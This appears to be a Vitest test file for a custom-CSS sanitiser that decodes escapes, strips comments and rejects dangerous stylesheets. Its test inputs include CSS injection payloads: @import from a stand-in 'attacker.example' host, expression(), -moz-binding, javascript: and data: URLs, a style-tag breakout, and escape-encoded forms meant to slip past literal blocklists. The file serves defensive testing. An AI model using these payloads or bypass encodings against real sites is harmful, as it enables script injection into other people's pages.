import { describe, expect, it } from "vitest";
import { decodeCssEscapes, sanitizeCustomCss, stripCssComments } from "../safe-css.js";

describe("decodeCssEscapes", () => {
  it("resolves hex escapes the way a browser does", () => {
    expect(decodeCssEscapes("@\\69 mport")).toBe("@import");
    expect(decodeCssEscapes("\\6a avascript:")).toBe("javascript:");
    expect(decodeCssEscapes("\\000069mport")).toBe("import");
  });

  it("resolves literal escapes", () => {
    expect(decodeCssEscapes("\\@import")).toBe("@import");
  });

  it("leaves ordinary text alone", () => {
    expect(decodeCssEscapes("body { color: red }")).toBe("body { color: red }");
  });
});

describe("stripCssComments", () => {
  it("replaces a comment with a space, matching how CSS tokenises", () => {
    // A comment separates tokens rather than joining them, so "@im/*x*/port"
    // is an at-keyword followed by an ident — it is not "@import", and must not
    // become one during normalisation either.
    expect(stripCssComments("@im/*x*/port")).toBe("@im port");
    expect(stripCssComments("a/*x*/{color:red}")).toBe("a {color:red}");
  });

  it("removes a comment used to pad a real declaration", () => {
    expect(stripCssComments("/* hi */@import url(x);")).toBe(" @import url(x);");
  });

  it("handles an unterminated comment", () => {
    expect(stripCssComments("a{} /* never closed")).toBe("a{}  ");
  });
});

describe("sanitizeCustomCss", () => {
  it("passes ordinary stylesheets through unchanged", () => {
    const css = ".card { color: #333; background: url(/uploads/a.png); }";
    expect(sanitizeCustomCss(css)).toBe(css);
  });

  it("rejects the plain forms", () => {
    for (const css of [
      '@import url("//attacker.example/x.css");',
      "body { width: expression(alert(1)); }",
      "body { -moz-binding: url(//attacker.example/x.xml); }",
      "a { behavior: url(#default#time2); }",
      "a { background: url(javascript:alert(1)); }",
      "a { background: url('data:text/html,<script>alert(1)</script>'); }",
      "</style><script>alert(1)</script>",
    ]) {
      expect(() => sanitizeCustomCss(css), css).toThrow(/disallowed/);
    }
  });

  it("rejects escape-encoded forms that a literal blocklist would miss", () => {
    for (const css of [
      "@\\69 mport url('//attacker.example/x.css');",
      "@\\000069mport url('//attacker.example/x.css');",
      "a { background: url(\\6a avascript:alert(1)); }",
      "a { \\62 ehavior: url(#x); }",
    ]) {
      expect(() => sanitizeCustomCss(css), css).toThrow(/disallowed/);
    }
  });

  it("still catches a blocked keyword padded with comments", () => {
    expect(() => sanitizeCustomCss("/* theme */ @import url('//attacker.example/a.css');")).toThrow(
      /disallowed/,
    );
  });

  it("allows a keyword that comments genuinely split, because CSS does not join it", () => {
    // "@im port" is two tokens and inert, so rejecting it would be a false positive.
    expect(sanitizeCustomCss("a { color: red } /* @im/*x*/")).toContain("color: red");
  });

  it("enforces the size limit", () => {
    expect(() => sanitizeCustomCss("a{}".repeat(20000))).toThrow(/KB limit/);
  });

  it("returns empty for blank input", () => {
    expect(sanitizeCustomCss("   ")).toBe("");
  });
});
